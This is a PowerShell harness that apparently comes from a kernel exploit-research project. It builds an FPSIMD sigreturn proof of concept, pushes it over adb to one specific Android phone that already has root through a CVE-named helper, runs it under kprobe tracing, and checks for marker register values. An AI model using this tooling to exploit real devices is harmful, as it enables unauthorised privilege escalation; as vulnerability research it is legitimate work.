param(
    [Parameter(Mandatory)]
    [string]$Serial,
    [string]$WslDistribution = 'Ubuntu-24.04',
    [string]$RootHelper = '/data/local/tmp/cve-2026-43499-root'
)

$ErrorActionPreference = 'Stop'
$adb = Join-Path $env:LOCALAPPDATA 'Android\Sdk\platform-tools\adb.exe'
$repo = Split-Path $PSScriptRoot -Parent
$targetFile = Join-Path $repo 'exploit\profiles\a536e-a536exxsngzg3\target.env'
$binary = Join-Path $repo 'exploit\out\fpsimd-writer-poc'
$probe = Join-Path $repo 'scripts\fpsimd-kprobe.sh'
$remoteBinary = '/data/local/tmp/fpsimd-writer-poc'
$remoteProbe = '/data/local/tmp/fpsimd-kprobe.sh'
$runId = Get-Date -Format 'yyyyMMdd-HHmmss'
$artifactDir = Join-Path $repo "artifacts\android\$runId-fpsimd-frame"

if (-not (Test-Path -LiteralPath $adb -PathType Leaf)) {
    throw "adb not found: $adb"
}

function Invoke-Adb([string[]]$Arguments) {
    $output = & $adb -s $Serial @Arguments 2>&1
    if ($LASTEXITCODE) {
        throw "adb failed ($LASTEXITCODE): $($Arguments -join ' ')`n$($output -join "`n")"
    }
    return $output -join "`n"
}

if ($repo -notmatch '^([A-Za-z]):\\(.*)$') {
    throw "repo is not on a Windows drive: $repo"
}
$wslDrive = $Matches[1].ToLowerInvariant()
$wslTail = $Matches[2] -replace '\\', '/'
$wslRepo = "/mnt/$wslDrive/$wslTail"
$wslNdk = & wsl.exe -d $WslDistribution -- bash -lc 'if [ -n "${ANDROID_NDK_HOME:-}" ] && [ -d "$ANDROID_NDK_HOME" ]; then printf %s "$ANDROID_NDK_HOME"; elif [ -d "$HOME/android-ndk-r29" ]; then printf %s "$HOME/android-ndk-r29"; else exit 1; fi'
if ($LASTEXITCODE) {
    throw 'Android NDK not found in WSL'
}
& wsl.exe -d $WslDistribution -- bash -lc "cd '$wslRepo' && ANDROID_NDK_HOME='$wslNdk' make -C exploit out/fpsimd-writer-poc"
if ($LASTEXITCODE) {
    throw 'FPSIMD PoC build failed'
}

$hostBinaryHash = (Get-FileHash -Algorithm SHA256 -LiteralPath $binary).Hash.ToLowerInvariant()
$hostProbeHash = (Get-FileHash -Algorithm SHA256 -LiteralPath $probe).Hash.ToLowerInvariant()
$target = @{}
Get-Content -LiteralPath $targetFile | ForEach-Object {
    if ($_ -match '^([A-Z0-9_]+)=(.*)$') {
        $target[$Matches[1]] = $Matches[2]
    }
}
$state = Invoke-Adb @('get-state')
$model = (Invoke-Adb @('shell', 'getprop ro.product.model')).Trim()
$build = (Invoke-Adb @('shell', 'getprop ro.build.version.incremental')).Trim()
$kernel = (Invoke-Adb @('shell', 'uname -r')).Trim()
if ($model -ne $target.TARGET_MODEL -or $build -ne $target.TARGET_BUILD -or
    $kernel -ne $target.TARGET_KERNEL_RELEASE) {
    throw "wrong target: model=$model build=$build kernel=$kernel"
}
$rootId = Invoke-Adb @('shell', "$RootHelper -c id")
if ($rootId -notmatch 'uid=0\(root\)') {
    throw "existing root is not active: $rootId"
}
$bootId = Invoke-Adb @('shell', 'cat /proc/sys/kernel/random/boot_id')
$uptime = Invoke-Adb @('shell', 'cat /proc/uptime')
Invoke-Adb @('push', $binary, $remoteBinary) | Write-Host
Invoke-Adb @('push', $probe, $remoteProbe) | Write-Host
Invoke-Adb @('shell', "chmod 755 $remoteBinary $remoteProbe") | Out-Null
$deviceHashes = Invoke-Adb @('shell', "sha256sum $remoteBinary $remoteProbe")
if ($deviceHashes -notmatch [regex]::Escape($hostBinaryHash) -or
    $deviceHashes -notmatch [regex]::Escape($hostProbeHash)) {
    throw "device checksum mismatch`n$deviceHashes"
}

New-Item -ItemType Directory -Force -Path $artifactDir | Out-Null
$setup = "$RootHelper -c '/system/bin/sh $remoteProbe setup'"
$capture = "$RootHelper -c '/system/bin/sh $remoteProbe capture'"
$cleanup = "$RootHelper -c '/system/bin/sh $remoteProbe cleanup'"
$pocOutput = ''
$traceOutput = ''

try {
    Invoke-Adb @('shell', $setup) | Write-Host
    $pocOutput = Invoke-Adb @('shell', "$remoteBinary frame")
    $pocOutput | Write-Host
    $traceOutput = Invoke-Adb @('shell', $capture)
    $traceOutput | Write-Host
} finally {
    Invoke-Adb @('shell', $cleanup) | Out-Null
}

if ($pocOutput -notmatch 'FPSIMD_SIGRETURN_DONE mode=frame' -or
    $traceOutput -notmatch 'restore_fpsimd_context\+0x338' -or
    $traceOutput -notmatch 'q0=0x465053494d440000' -or
    $traceOutput -notmatch 'q9=0x465053494d440009') {
    throw 'FPSIMD live oracle did not see the exact marker'
}

$utf8 = [Text.UTF8Encoding]::new($false)
[IO.File]::WriteAllText((Join-Path $artifactDir 'poc.log'), $pocOutput + "`n", $utf8)
[IO.File]::WriteAllText((Join-Path $artifactDir 'trace.log'), $traceOutput + "`n", $utf8)
$manifest = @(
    "serial=$Serial"
    "state=$state"
    "model=$model"
    "build=$build"
    "kernel=$kernel"
    "boot_id=$bootId"
    "uptime=$uptime"
    "root=$rootId"
    "binary_sha256=$hostBinaryHash"
    "probe_sha256=$hostProbeHash"
) -join "`n"
[IO.File]::WriteAllText((Join-Path $artifactDir 'manifest.txt'), $manifest + "`n", $utf8)
Write-Host "FPSIMD_FRAME_OK artifacts=$artifactDir"
